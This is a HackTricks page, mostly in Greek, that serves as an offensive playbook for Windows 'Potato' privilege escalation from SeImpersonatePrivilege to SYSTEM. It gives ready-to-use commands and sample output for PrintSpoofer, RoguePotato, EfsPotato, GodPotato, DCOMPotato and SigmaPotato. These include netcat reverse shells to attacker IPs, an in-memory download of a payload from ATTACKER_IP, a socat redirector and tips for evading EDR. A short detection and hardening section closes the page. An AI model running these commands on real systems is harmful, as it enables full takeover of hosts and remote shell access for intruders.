# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και νεότερες εκδόσεις. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να χρησιμοποιηθούν για **αξιοποίηση των ίδιων προνομίων και απόκτηση πρόσβασης επιπέδου `NT AUTHORITY\SYSTEM`**. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται τακτικά το 2024–2025 είναι SigmaPotato (a fork of GodPotato) που προσθέτει in-memory/.NET reflection usage και εκτεταμένη υποστήριξη OS. Δείτε γρήγορη χρήση παρακάτω και το repo στις Αναφορές.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και συνηθισμένα προβλήματα

Όλες οι παρακάτω τεχνικές βασίζονται στην κατάχρηση μιας υπηρεσίας με δυνατότητα impersonation από πλαίσιο που διαθέτει κάποιο από τα παρακάτω προνόμια:

- SeImpersonatePrivilege (το πιο συνηθισμένο) ή SeAssignPrimaryTokenPrivilege
- Δεν απαιτείται high integrity αν το token έχει ήδη SeImpersonatePrivilege (τυπικό για πολλούς λογαριασμούς υπηρεσιών όπως IIS AppPool, MSSQL, κ.λπ.)

Ελέγξτε τα προνόμια γρήγορα:
```cmd
whoami /priv | findstr /i impersonate
```
Λειτουργικές σημειώσεις:

- PrintSpoofer χρειάζεται την υπηρεσία Print Spooler να είναι ενεργή και προσβάσιμη μέσω του τοπικού RPC endpoint (spoolss). Σε σκληροποιημένα περιβάλλοντα όπου ο Spooler έχει απενεργοποιηθεί μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato απαιτεί έναν OXID resolver προσβάσιμο μέσω TCP/135. Εάν το egress είναι μπλοκαρισμένο, χρησιμοποιήστε έναν redirector/port-forwarder (βλέπε παράδειγμα παρακάτω). Παλαιότερα builds απαιτούσαν το -f flag.
- EfsPotato/SharpEfsPotato εκμεταλλεύονται το MS-EFSR· αν ένας pipe είναι μπλοκαρισμένος, δοκιμάστε εναλλακτικούς pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το Error 0x6d3 κατά τη διάρκεια του RpcBindingSetAuthInfo συνήθως υποδεικνύει μια άγνωστη/μη υποστηριζόμενη RPC authentication service· δοκιμάστε διαφορετικό pipe/transport ή βεβαιωθείτε ότι η στοχευόμενη υπηρεσία τρέχει.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε -i για να εκκινήσετε μια διαδραστική διεργασία στην τρέχουσα κονσόλα, ή -c για να εκτελέσετε μια εντολή μίας γραμμής.
- Απαιτεί την υπηρεσία Spooler. Εάν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Αν η εξερχόμενη θύρα 135 είναι μπλοκαρισμένη, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν ένα pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα άλλα υποστηριζόμενα pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν υπάρχει το SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν αντικείμενα υπηρεσίας DCOM που έχουν προεπιλογή το RPC_C_IMP_LEVEL_IMPERSONATE. Δημιουργήστε ή χρησιμοποιήστε τα παρεχόμενα binaries και τρέξτε την εντολή σας:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ενημερωμένο fork του GodPotato)

Το SigmaPotato προσθέτει σύγχρονες βελτιώσεις, όπως in-memory execution μέσω .NET reflection και ένα βοηθητικό για PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Σημειώσεις ανίχνευσης και σκληρύνσεως

- Παρακολουθήστε για διεργασίες που δημιουργούν named pipes και καλούν αμέσως token-duplication APIs ακολουθούμενα από CreateProcessAsUser/CreateProcessWithTokenW. Το Sysmon μπορεί να αποκαλύψει χρήσιμη τηλεμετρία: Event ID 1 (δημιουργία διεργασίας), 17/18 (named pipe created/connected), και command lines που spawn-άρουν child processes ως SYSTEM.
- Spooler hardening: Η απενεργοποίηση της Print Spooler service σε servers όπου δεν απαιτείται αποτρέπει PrintSpoofer-style local coercions μέσω spoolss.
- Service account hardening: Ελαχιστοποιήστε την ανάθεση των SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege σε custom services. Σκεφτείτε να τρέχετε services υπό virtual accounts με τα ελάχιστα απαιτούμενα προνόμια και να τα απομονώνετε με service SID και write-restricted tokens όταν είναι δυνατό.
- Network controls: Το μπλοκάρισμα outbound TCP/135 ή ο περιορισμός της κίνησης RPC endpoint mapper μπορεί να σπάσει το RoguePotato εκτός αν υπάρχει διαθέσιμο internal redirector.
- EDR/AV: Όλα αυτά τα εργαλεία είναι ευρέως ανιχνεύσιμα με signatures. Η recompilation από το source, η μετονομασία symbols/strings ή η χρήση in-memory execution μπορεί να μειώσει την ανιχνευσιμότητα αλλά δεν θα παρακάμψει αξιόπιστες behavioral ανιχνεύσεις.

## Αναφορές

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
